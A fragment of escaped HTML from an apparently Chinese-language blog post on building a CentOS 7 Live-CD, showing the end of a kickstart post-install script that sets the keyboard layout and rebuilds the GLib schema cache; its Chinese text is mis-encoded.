class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Fixing default locale to us\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elocalectl set-keymap us\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elocalectl set-x11-keymap us\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# rebuild schema cache with any overrides we installed\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eglib-compile-schemas /usr/share/glib-2.0/schemas\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%end\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼Œä¸Šé¢æ³¨é‡Šäº†ä¸¤ä¸ªåœ°æ–¹ï¼Œéƒ½å¯ä»¥æ·»åŠ è½¯ä»¶æˆ–è€…è¿è¡Œè„šæœ¬\u003c/p\u003e","title":"CentOS 7 Live-CD çš„åˆ¶ä½œ"}]